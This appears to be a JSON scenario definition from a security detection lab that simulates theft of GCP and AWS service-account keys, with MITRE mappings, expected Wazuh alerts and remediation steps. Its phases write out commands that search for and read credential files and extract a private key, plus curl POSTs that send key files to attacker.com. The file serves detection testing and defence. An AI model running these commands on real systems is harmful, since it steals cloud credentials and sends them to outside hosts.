{
  "id": "S2-04",
  "name": "Service Account Key Exfiltration",
  "category": "Cloud Service Accounts",
  "version": "1.0",
  "description": "Exfiltrate GCP service account keys or AWS access keys from compromised systems",
  "difficulty": "Medium",
  "real_world_relevance": "GCP service account key theft, long-lived credential abuse",

  "mitre_attack": {
    "tactics": ["Credential Access", "Exfiltration"],
    "techniques": [
      {"id": "T1552.001", "name": "Unsecured Credentials: Credentials In Files"},
      {"id": "T1567", "name": "Exfiltration Over Web Service"}
    ]
  },

  "prerequisites": {
    "containers": ["cloud-workload"],
    "network": "cloud_net"
  },

  "attack_flow": {
    "description": "Attacker discovers and exfiltrates long-lived service account credentials",
    "diagram": [
      "1. Attacker gains access to system with service account keys",
      "2. Attacker searches for credential files (JSON keys, .aws/credentials)",
      "3. Attacker finds long-lived service account keys",
      "4. Attacker exfiltrates keys to external system",
      "5. Attacker uses keys from their own infrastructure"
    ]
  },

  "phases": [
    {
      "name": "Credential Discovery",
      "description": "Search for service account key files",
      "actions": [
        {
          "type": "command",
          "command": "find / -name '*.json' -exec grep -l 'private_key' {} \\; 2>/dev/null",
          "expected_output_contains": ["service-account.json"]
        },
        {
          "type": "command",
          "command": "find /home -name 'credentials' -o -name '*.pem' -o -name '*key*.json' 2>/dev/null",
          "description": "Find AWS and GCP credential files"
        }
      ]
    },
    {
      "name": "AWS Credential Search",
      "description": "Find AWS credentials",
      "actions": [
        {
          "type": "command",
          "command": "cat ~/.aws/credentials 2>/dev/null || cat /root/.aws/credentials 2>/dev/null",
          "expected_output_contains": ["aws_access_key_id", "aws_secret_access_key"]
        }
      ]
    },
    {
      "name": "GCP Key Extraction",
      "description": "Extract GCP service account key",
      "actions": [
        {
          "type": "command",
          "command": "cat /app/service-account.json | jq -r '.private_key'",
          "description": "Extract private key from GCP service account JSON"
        }
      ]
    },
    {
      "name": "Exfiltration",
      "description": "Exfiltrate credentials to attacker infrastructure",
      "critical": true,
      "actions": [
        {
          "type": "command",
          "command": "curl -X POST https://attacker.com/receive -d @/app/service-account.json",
          "description": "Exfiltrate via HTTP POST"
        },
        {
          "type": "command",
          "command": "base64 /app/service-account.json | curl -X POST https://attacker.com/b64 -d @-",
          "description": "Base64 encoded exfiltration"
        }
      ]
    }
  ],

  "indicators_of_compromise": [
    {
      "type": "File Access",
      "description": "Access to service account key files",
      "wazuh_rule": "100706"
    },
    {
      "type": "Process",
      "description": "Find/grep commands searching for credential files",
      "wazuh_rule": "100707"
    },
    {
      "type": "Network",
      "description": "Outbound POST with JSON/key content",
      "wazuh_rule": "100708"
    }
  ],

  "expected_wazuh_alerts": [
    {
      "rule_id": "100706",
      "level": 10,
      "description": "NHI: Service account key file accessed"
    },
    {
      "rule_id": "100707",
      "level": 8,
      "description": "NHI: Credential file search detected"
    },
    {
      "rule_id": "100708",
      "level": 14,
      "description": "NHI: Potential credential exfiltration via HTTP"
    }
  ],

  "remediation": {
    "immediate": [
      "Rotate all exposed service account keys",
      "Revoke and delete compromised keys from cloud console",
      "Block known attacker IPs"
    ],
    "long_term": [
      "Migrate from long-lived keys to workload identity",
      "Use GCP Workload Identity Federation",
      "Use AWS IAM Roles instead of access keys",
      "Implement key rotation policies",
      "Enable key usage monitoring and alerting"
    ],
    "gcp_commands": [
      "# List service account keys",
      "gcloud iam service-accounts keys list --iam-account=SA@PROJECT.iam.gserviceaccount.com",
      "",
      "# Delete compromised key",
      "gcloud iam service-accounts keys delete KEY_ID --iam-account=SA@PROJECT.iam.gserviceaccount.com",
      "",
      "# Enable Workload Identity",
      "gcloud container clusters update CLUSTER --workload-pool=PROJECT.svc.id.goog"
    ],
    "aws_commands": [
      "# List access keys",
      "aws iam list-access-keys --user-name service-user",
      "",
      "# Delete compromised key",
      "aws iam delete-access-key --user-name service-user --access-key-id AKIAXXXXXXXX",
      "",
      "# Use IAM role instead",
      "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ServiceRole"
    ]
  },

  "demo_script": {
    "container": "cloud-workload",
    "commands": [
      "# Search for GCP service account keys",
      "find / -name '*.json' -exec grep -l 'private_key' {} \\; 2>/dev/null",
      "",
      "# Search for AWS credentials",
      "find / -path '*/.aws/credentials' 2>/dev/null",
      "",
      "# Simulate exfiltration (to local mock)",
      "cat /opt/demo/service-account.json | base64"
    ]
  },

  "references": [
    {
      "title": "GCP Service Account Key Best Practices",
      "url": "https://cloud.google.com/iam/docs/best-practices-for-managing-service-account-keys"
    },
    {
      "title": "AWS Security Best Practices - Access Keys",
      "url": "https://docs.aws.amazon.com/accounts/latest/reference/best-practices-root-user.html"
    },
    {
      "title": "MITRE ATT&CK T1567",
      "url": "https://attack.mitre.org/techniques/T1567/"
    }
  ]
}
